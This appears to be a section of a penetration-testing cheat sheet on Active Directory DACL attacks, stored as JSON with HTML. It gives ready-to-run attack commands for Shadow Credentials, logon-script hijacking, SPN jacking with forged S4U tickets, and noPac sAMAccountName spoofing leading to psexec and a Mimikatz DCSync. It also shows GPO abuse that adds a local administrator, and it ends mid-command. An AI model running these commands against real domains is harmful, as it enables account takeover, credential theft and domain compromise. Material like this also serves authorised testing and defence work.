{"title": "DACL Attacks II", "source": "active-directory", "source_label": "Active Directory", "path": "Active Directory/DACL Attacks II", "html": "<h2 id=\"shadow-credentials\">Shadow Credentials</h2>\n<p>Abuse <code>msDS-KeyCredentialLink</code> write access to add a certificate-based credential to a target account, then request a TGT and extract the NT hash without changing the password.</p>\n<h3 id=\"check-for-existing-key-credentials\">Check for Existing Key Credentials</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"n\">-Filter</span> <span class=\"s1\">&#39;(msDS-KeyCredentialLink=*)&#39;</span>\n<span class=\"p\">.\\</span><span class=\"n\">Whisker</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">list</span> <span class=\"p\">/</span><span class=\"n\">target</span><span class=\"p\">:&lt;</span><span class=\"n\">target</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"add-key-credential-windows-whisker\">Add Key Credential (Windows - Whisker)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Whisker</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">add</span> <span class=\"p\">/</span><span class=\"n\">target</span><span class=\"p\">:&lt;</span><span class=\"n\">target</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">asktgt</span> <span class=\"p\">/</span><span class=\"n\">user</span><span class=\"p\">:&lt;</span><span class=\"n\">target</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">certificate</span><span class=\"p\">:&lt;</span><span class=\"n\">certificate</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">password</span><span class=\"p\">:</span><span class=\"s2\">&quot;&lt;password&gt;&quot;</span> <span class=\"p\">/</span><span class=\"n\">domain</span><span class=\"p\">:&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">dc</span><span class=\"p\">:&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">getcredentials</span> <span class=\"p\">/</span><span class=\"n\">show</span>\n</code></pre></div>\n<h3 id=\"cleanup\">Cleanup</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Whisker</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">remove</span> <span class=\"p\">/</span><span class=\"n\">target</span><span class=\"p\">:&lt;</span><span class=\"n\">target</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">deviceid</span><span class=\"p\">:&lt;</span><span class=\"n\">deviceid</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">Whisker</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"nb\">clear </span><span class=\"p\">/</span><span class=\"n\">target</span><span class=\"p\">:&lt;</span><span class=\"n\">target</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"shadow-credentials-from-linux-pywhisker\">Shadow Credentials from Linux (pyWhisker)</h3>\n<div class=\"highlight\"><pre><span></span><code>python3<span class=\"w\"> </span>pywhisker.py<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>--target<span class=\"w\"> </span>&lt;target&gt;<span class=\"w\"> </span>--action<span class=\"w\"> </span>add\npython3<span class=\"w\"> </span>gettgtpkinit.py<span class=\"w\"> </span>-cert-pfx<span class=\"w\"> </span>&lt;certificate&gt;<span class=\"w\"> </span>-pfx-pass<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>&lt;domain&gt;/&lt;target&gt;<span class=\"w\"> </span>&lt;ccache-file&gt;\n<span class=\"nv\">KRB5CCNAME</span><span class=\"o\">=</span>&lt;ccache-file&gt;<span class=\"w\"> </span>python3<span class=\"w\"> </span>getnthash.py<span class=\"w\"> </span>-key<span class=\"w\"> </span>&lt;key&gt;<span class=\"w\"> </span>&lt;domain&gt;/&lt;target&gt;\n<span class=\"nv\">KRB5CCNAME</span><span class=\"o\">=</span>&lt;ccache-file&gt;<span class=\"w\"> </span>smbclient.py<span class=\"w\"> </span>-k<span class=\"w\"> </span>-no-pass<span class=\"w\"> </span>&lt;dc-hostname&gt;\n</code></pre></div>\n<h3 id=\"get-aces-on-a-target\">Get ACEs on a Target</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainObjectAcl</span> <span class=\"n\">-Identity</span> <span class=\"p\">&lt;</span><span class=\"n\">target</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<div class=\"highlight\"><pre><span></span><code>python3<span class=\"w\"> </span>examples/dacledit.py<span class=\"w\"> </span>-principal<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-target<span class=\"w\"> </span>&lt;target&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;domain&gt;&#39;</span>/<span class=\"s1\">&#39;&lt;username&gt;&#39;</span>:<span class=\"s1\">&#39;&lt;password&gt;&#39;</span>\n</code></pre></div>\n<hr />\n<h2 id=\"logon-script-abuse\">Logon Script Abuse</h2>\n<p>If you have <code>WriteProperty</code> over the <code>scriptPath</code> attribute of a user account, you can set their logon script to a path you control in NETLOGON.</p>\n<h3 id=\"set-scriptpath-bloodyad\">Set scriptPath (bloodyAD)</h3>\n<div class=\"highlight\"><pre><span></span><code>bloodyAD<span class=\"w\"> </span>--host<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;dc-ip&gt;&quot;</span><span class=\"w\"> </span>-d<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;domain&gt;&quot;</span><span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;username&gt;&quot;</span><span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span><span class=\"nb\">set</span><span class=\"w\"> </span>object<span class=\"w\"> </span>&lt;target-user&gt;<span class=\"w\"> </span>scriptPath<span class=\"w\"> </span>-v<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;path&gt;&#39;</span>\nbloodyAD<span class=\"w\"> </span>--host<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;dc-ip&gt;&quot;</span><span class=\"w\"> </span>-d<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;domain&gt;&quot;</span><span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;username&gt;&quot;</span><span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>get<span class=\"w\"> </span>object<span class=\"w\"> </span>&lt;target-user&gt;<span class=\"w\"> </span>--attr<span class=\"w\"> </span>scriptPath\n</code></pre></div>\n<h3 id=\"set-scriptpath-powerview\">Set scriptPath (PowerView)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Set-DomainObject</span> <span class=\"p\">&lt;</span><span class=\"n\">target-user</span><span class=\"p\">&gt;</span> <span class=\"n\">-Set</span> <span class=\"p\">@{</span><span class=\"s1\">&#39;scriptPath&#39;</span><span class=\"p\">=</span><span class=\"s1\">&#39;&lt;path&gt;&#39;</span><span class=\"p\">}</span>\n<span class=\"nb\">Get-DomainObject</span> <span class=\"p\">&lt;</span><span class=\"n\">target-user</span><span class=\"p\">&gt;</span> <span class=\"n\">-Properties</span> <span class=\"n\">scriptPath</span>\n</code></pre></div>\n<h3 id=\"check-netlogon-permissions\">Check NETLOGON Permissions</h3>\n<div class=\"highlight\"><pre><span></span><code>smbcacls<span class=\"w\"> </span>//&lt;dc-ip&gt;/NETLOGON<span class=\"w\"> </span>&lt;dir&gt;<span class=\"w\"> </span>-U<span class=\"w\"> </span>&lt;username&gt;%<span class=\"s1\">&#39;&lt;password&gt;&#39;</span>\n</code></pre></div>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">ls </span><span class=\"nv\">$env:LOGONSERVER</span><span class=\"p\">\\</span><span class=\"n\">NETLOGON</span>\n<span class=\"n\">icacls</span> <span class=\"nv\">$env:LOGONSERVER</span><span class=\"p\">\\</span><span class=\"n\">NETLOGON</span><span class=\"p\">\\&lt;</span><span class=\"n\">dir</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"enumerate-with-pywerview\">Enumerate with PywerView</h3>\n<div class=\"highlight\"><pre><span></span><code>pywerview<span class=\"w\"> </span>get-objectacl<span class=\"w\"> </span>--name<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;target-user&gt;&#39;</span><span class=\"w\"> </span>-w<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-t<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;&#39;</span><span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>--resolve-sids<span class=\"w\"> </span>--resolve-guids\n</code></pre></div>\n<h3 id=\"scriptsentry-find-misconfigured-logon-scripts\">ScriptSentry - Find Misconfigured Logon Scripts</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"nb\">Invoke-ScriptSentry</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n</code></pre></div>\n<h3 id=\"collect-ad-data-with-adalanche\">Collect AD Data with Adalanche</h3>\n<div class=\"highlight\"><pre><span></span><code>./adalanche-linux-x64<span class=\"w\"> </span>collect<span class=\"w\"> </span>activedirectory<span class=\"w\"> </span>--domain<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>--server<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>--username<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;&#39;</span><span class=\"w\"> </span>--password<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span>\n./adalanche-linux-x64<span class=\"w\"> </span>analyze<span class=\"w\"> </span>--datapath<span class=\"w\"> </span>&lt;datapath&gt;\n</code></pre></div>\n<hr />\n<h2 id=\"spn-jacking\">SPN Jacking</h2>\n<p>If you have <code>WriteSPN</code> over a computer that is configured for constrained delegation to an orphaned (deleted) SPN, you can hijack that delegation to forge tickets as a privileged user.</p>\n<h3 id=\"find-writespn-rights-bloodhound-cypher\">Find WriteSPN Rights (BloodHound Cypher)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"k\">MATCH</span><span class=\"w\"> </span><span class=\"n\">p</span><span class=\"p\">=(</span><span class=\"n\">n</span><span class=\"p\">:</span><span class=\"n\">User</span><span class=\"p\">)</span><span class=\"o\">-[</span><span class=\"n\">r1</span><span class=\"p\">:</span><span class=\"n\">WriteSPN</span><span class=\"p\">*</span><span class=\"m\">1</span><span class=\"p\">..</span><span class=\"o\">]-&gt;</span><span class=\"p\">(</span><span class=\"n\">c</span><span class=\"p\">:</span><span class=\"n\">Computer</span><span class=\"p\">)</span><span class=\"w\"> </span><span class=\"k\">RETURN</span><span class=\"w\"> </span><span class=\"n\">p</span>\n</code></pre></div>\n<h3 id=\"find-writespn-rights-powerview\">Find WriteSPN Rights (PowerView)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainComputer</span> <span class=\"p\">|</span> <span class=\"nb\">Get-DomainObjectAcl</span> <span class=\"n\">-ResolveGUIDs</span> <span class=\"p\">|</span> <span class=\"p\">?{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-eq</span> <span class=\"p\">$(</span><span class=\"nb\">ConvertTo-SID</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;)}</span>\n</code></pre></div>\n<h3 id=\"list-computers-with-constrained-delegation\">List Computers with Constrained Delegation</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainComputer</span> <span class=\"n\">-TrustedToAuth</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">name</span><span class=\"p\">,</span> <span class=\"n\">msds-allowedtodelegateto</span>\n</code></pre></div>\n<h3 id=\"find-orphaned-spns\">Find Orphaned SPNs</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-ConstrainedDelegation</span> <span class=\"n\">-CheckOrphaned</span>\n</code></pre></div>\n<h3 id=\"assign-orphaned-spn-to-target-hijack\">Assign Orphaned SPN to Target (Hijack)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Set-DomainObject</span> <span class=\"n\">-Identity</span> <span class=\"p\">&lt;</span><span class=\"n\">target</span><span class=\"p\">&gt;</span> <span class=\"n\">-Set</span> <span class=\"p\">@{</span><span class=\"n\">serviceprincipalname</span><span class=\"p\">=</span><span class=\"s1\">&#39;&lt;SPN&gt;&#39;</span><span class=\"p\">}</span> <span class=\"n\">-Verbose</span>\n</code></pre></div>\n<h3 id=\"s4u-attack-to-forge-ticket\">S4U Attack to Forge Ticket</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">s4u</span> <span class=\"p\">/</span><span class=\"n\">domain</span><span class=\"p\">:&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">user</span><span class=\"p\">:&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">rc4</span><span class=\"p\">:&lt;</span><span class=\"n\">hash</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">impersonateuser</span><span class=\"p\">:&lt;</span><span class=\"n\">admin-user</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">msdsspn</span><span class=\"p\">:</span><span class=\"s2\">&quot;&lt;SPN&gt;&quot;</span> <span class=\"p\">/</span><span class=\"n\">nowrap</span>\n<span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">tgssub</span> <span class=\"p\">/</span><span class=\"n\">ticket</span><span class=\"p\">:&lt;</span><span class=\"n\">base64</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">altservice</span><span class=\"p\">:&lt;</span><span class=\"n\">service</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"cleanup-spns\">Cleanup SPNs</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Set-DomainObject</span> <span class=\"n\">-Identity</span> <span class=\"p\">&lt;</span><span class=\"n\">target</span><span class=\"p\">&gt;</span> <span class=\"n\">-Clear</span> <span class=\"s1\">&#39;serviceprincipalname&#39;</span> <span class=\"n\">-Verbose</span>\n</code></pre></div>\n<h3 id=\"from-linux-with-proxychains\">From Linux with proxychains</h3>\n<div class=\"highlight\"><pre><span></span><code>proxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>findDelegation.py<span class=\"w\"> </span>-target-domain<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-dc-host<span class=\"w\"> </span>&lt;dc-hostname&gt;<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;\nproxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>addspn.py<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;domain&gt;/&lt;username&gt;&#39;</span><span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>--clear<span class=\"w\"> </span>-t<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;target&gt;&#39;</span>\nproxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>getST.py<span class=\"w\"> </span>-spn<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;SPN&gt;&#39;</span><span class=\"w\"> </span>-impersonate<span class=\"w\"> </span>&lt;admin-user&gt;<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;domain&gt;/&lt;account&gt;&#39;</span><span class=\"w\"> </span>-hashes<span class=\"w\"> </span>:&lt;hash&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;\nproxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>tgssub.py<span class=\"w\"> </span>-in<span class=\"w\"> </span>&lt;ticket-file&gt;<span class=\"w\"> </span>-altservice<span class=\"w\"> </span><span class=\"s2\">&quot;&lt;service&gt;&quot;</span><span class=\"w\"> </span>-out<span class=\"w\"> </span>&lt;new-ticket-file&gt;\ndescribeTicket.py<span class=\"w\"> </span>&lt;ticket-file&gt;\n<span class=\"nv\">KRB5CCNAME</span><span class=\"o\">=</span>&lt;ticket-file&gt;<span class=\"w\"> </span>smbexec.py<span class=\"w\"> </span>-k<span class=\"w\"> </span>-no-pass<span class=\"w\"> </span>&lt;target&gt;\n</code></pre></div>\n<hr />\n<h2 id=\"samaccountname-spoofing-nopac-cve-2021-4227842287\">sAMAccountName Spoofing (NoPac / CVE-2021-42278/42287)</h2>\n<p>Create a machine account, rename it to match a DC name (without trailing $), request a TGT, then request a service ticket as Administrator via S4U2self.</p>\n<h3 id=\"scan-for-vulnerability\">Scan for Vulnerability</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">noPac</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">scan</span> <span class=\"n\">-domain</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-user</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"n\">-pass</span> <span class=\"p\">&lt;</span><span class=\"n\">password</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<div class=\"highlight\"><pre><span></span><code>python3<span class=\"w\"> </span>noPac/scanner.py<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<span class=\"w\"> </span>-use-ldap\n</code></pre></div>\n<h3 id=\"check-machineaccountquota\">Check MachineAccountQuota</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">(</span><span class=\"nb\">Get-DomainObject</span> <span class=\"n\">-SearchScope</span> <span class=\"n\">Base</span><span class=\"p\">).</span><span class=\"s2\">&quot;ms-ds-machineaccountquota&quot;</span>\n</code></pre></div>\n<h3 id=\"create-machine-account-powermad\">Create Machine Account (PowerMad)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">New-MachineAccount</span> <span class=\"n\">-MachineAccount</span> <span class=\"s2\">&quot;&lt;account&gt;&quot;</span> <span class=\"n\">-Password</span> <span class=\"nv\">$password</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-DomainController</span> <span class=\"p\">&lt;</span><span class=\"n\">dc-ip</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"clear-spns-and-rename-to-dc-name\">Clear SPNs and Rename to DC Name</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Set-DomainObject</span> <span class=\"n\">-Identity</span> <span class=\"s1\">&#39;&lt;account&gt;$&#39;</span> <span class=\"n\">-Clear</span> <span class=\"s1\">&#39;serviceprincipalname&#39;</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-DomainController</span> <span class=\"p\">&lt;</span><span class=\"n\">dc-ip</span><span class=\"p\">&gt;</span>\n<span class=\"nb\">Set-MachineAccountAttribute</span> <span class=\"n\">-MachineAccount</span> <span class=\"s2\">&quot;&lt;account&gt;&quot;</span> <span class=\"n\">-Value</span> <span class=\"s2\">&quot;&lt;dc-hostname&gt;&quot;</span> <span class=\"n\">-Attribute</span> <span class=\"n\">samaccountname</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-DomainController</span> <span class=\"p\">&lt;</span><span class=\"n\">dc-ip</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"request-tgt-restore-name-request-s4u2self-ticket\">Request TGT, Restore Name, Request S4U2self Ticket</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">asktgt</span> <span class=\"p\">/</span><span class=\"n\">user</span><span class=\"p\">:&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">password</span><span class=\"p\">:&lt;</span><span class=\"n\">password</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">domain</span><span class=\"p\">:&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">dc</span><span class=\"p\">:&lt;</span><span class=\"n\">dc-ip</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">nowrap</span>\n<span class=\"c\"># Restore sAMAccountName back to original</span>\n<span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">s4u</span> <span class=\"p\">/</span><span class=\"n\">self</span> <span class=\"p\">/</span><span class=\"n\">impersonateuser</span><span class=\"p\">:&lt;</span><span class=\"n\">admin-user</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">altservice</span><span class=\"p\">:</span><span class=\"s2\">&quot;&lt;service&gt;/&lt;dc-hostname&gt;&quot;</span> <span class=\"p\">/</span><span class=\"n\">dc</span><span class=\"p\">:&lt;</span><span class=\"n\">dc-ip</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">ptt</span> <span class=\"p\">/</span><span class=\"n\">ticket</span><span class=\"p\">:&lt;</span><span class=\"n\">ticket</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"from-linux-bloodyad-impacket\">From Linux (bloodyAD + Impacket)</h3>\n<div class=\"highlight\"><pre><span></span><code>python3<span class=\"w\"> </span>bloodyAD.py<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>--host<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>get<span class=\"w\"> </span>object<span class=\"w\"> </span>&lt;account&gt;\npython3<span class=\"w\"> </span>bloodyAD.py<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>--host<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"nb\">set</span><span class=\"w\"> </span>object<span class=\"w\"> </span>&lt;account&gt;<span class=\"w\"> </span>&lt;attribute&gt;\ngetTGT.py<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;\n<span class=\"nv\">KRB5CCNAME</span><span class=\"o\">=</span>&lt;ticket-file&gt;<span class=\"w\"> </span>getST.py<span class=\"w\"> </span>&lt;domain&gt;/&lt;username&gt;<span class=\"w\"> </span>-self<span class=\"w\"> </span>-impersonate<span class=\"w\"> </span>&lt;admin-user&gt;<span class=\"w\"> </span>-altservice<span class=\"w\"> </span>&lt;service&gt;<span class=\"w\"> </span>-k<span class=\"w\"> </span>-no-pass<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;\n<span class=\"nv\">KRB5CCNAME</span><span class=\"o\">=</span>&lt;ticket-file&gt;<span class=\"w\"> </span>psexec.py<span class=\"w\"> </span>&lt;dc-hostname&gt;<span class=\"w\"> </span>-k<span class=\"w\"> </span>-no-pass\n</code></pre></div>\n<h3 id=\"mimikatz-dcsync-after-compromise\">Mimikatz DCSync After Compromise</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">mimikatz</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"s2\">&quot;lsadump::dcsync /domain:&lt;domain&gt; /kdc:&lt;dc-hostname&gt; /user:&lt;username&gt;&quot;</span> <span class=\"n\">exit</span>\n</code></pre></div>\n<hr />\n<h2 id=\"gpo-attacks\">GPO Attacks</h2>\n<p>If you have modification rights over a GPO that is linked to an OU containing computers or users, you can use it to execute arbitrary commands.</p>\n<h3 id=\"enumerate-gpo-rights\">Enumerate GPO Rights</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nv\">$userSID</span> <span class=\"p\">=</span> <span class=\"nb\">ConvertTo-SID</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span>\n<span class=\"nb\">Get-DomainGPO</span>\n<span class=\"nb\">Get-DomainObject</span> <span class=\"n\">-SearchScope</span> <span class=\"n\">Base</span> <span class=\"n\">-Properties</span> <span class=\"n\">gplink</span>\n<span class=\"nb\">Get-DomainObjectAcl</span> <span class=\"n\">-ResolveGUIDs</span>\n<span class=\"nb\">ConvertFrom-SID</span> <span class=\"n\">S</span><span class=\"p\">-</span><span class=\"n\">1</span><span class=\"p\">-</span><span class=\"n\">5</span><span class=\"p\">-</span><span class=\"n\">21</span><span class=\"p\">-...</span>\n<span class=\"nb\">Get-DomainGroupMember</span> <span class=\"s2\">&quot;&lt;group-name&gt;&quot;</span>\n<span class=\"nb\">Get-DomainSite</span> <span class=\"n\">-Properties</span> <span class=\"n\">gplink</span>\n<span class=\"nb\">Get-DomainOU</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">name</span><span class=\"p\">,</span> <span class=\"n\">gplink</span>\n<span class=\"nb\">Get-DomainOU</span> <span class=\"p\">|</span> <span class=\"k\">foreach</span> <span class=\"p\">{</span> <span class=\"nv\">$ou</span> <span class=\"p\">=</span> <span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">distinguishedname</span><span class=\"p\">;</span> <span class=\"nb\">Get-DomainComputer</span> <span class=\"n\">-SearchBase</span> <span class=\"nv\">$ou</span> <span class=\"n\">-Properties</span> <span class=\"n\">dnshostname</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"p\">@{</span><span class=\"n\">Name</span><span class=\"p\">=</span><span class=\"s1\">&#39;OU&#39;</span><span class=\"p\">;</span><span class=\"n\">Expression</span><span class=\"p\">={</span><span class=\"nv\">$ou</span><span class=\"p\">}},</span> <span class=\"p\">@{</span><span class=\"n\">Name</span><span class=\"p\">=</span><span class=\"s1\">&#39;FQDN&#39;</span><span class=\"p\">;</span><span class=\"n\">Expression</span><span class=\"p\">={</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">dnshostname</span><span class=\"p\">}}</span> <span class=\"p\">}</span>\n</code></pre></div>\n<h3 id=\"create-and-link-a-gpo\">Create and Link a GPO</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">New-GPO</span> <span class=\"n\">-Name</span> <span class=\"n\">TestGPO</span> <span class=\"n\">-Comment</span> <span class=\"s2\">&quot;This is a test GPO.&quot;</span>\n<span class=\"nb\">New-GPLink</span> <span class=\"n\">-Name</span> <span class=\"n\">TestGPO</span> <span class=\"n\">-Target</span> <span class=\"s2\">&quot;OU=TestOU,DC=&lt;domain&gt;,DC=local&quot;</span>\n</code></pre></div>\n<h3 id=\"find-gpos-you-can-modify\">Find GPOs You Can Modify</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-GPOEnumeration</span>\n</code></pre></div>\n<h3 id=\"sharpgpoabuse-add-local-admin\">SharpGPOAbuse - Add Local Admin</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">SharpGPOAbuse</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"p\">-</span><span class=\"n\">-AddLocalAdmin</span> <span class=\"p\">-</span><span class=\"n\">-UserAccount</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"p\">-</span><span class=\"n\">-GPOName</span> <span class=\"s2\">&quot;Default Security Policy - WKS&quot;</span>\n</code></pre></div>\n<h3 id=\"gpowned-from-linux-via-proxychains\">GPOwned from Linux (via proxychains)</h3>\n<div class=\"highlight\"><pre><span></span><code>proxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>GPOwned.py<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> 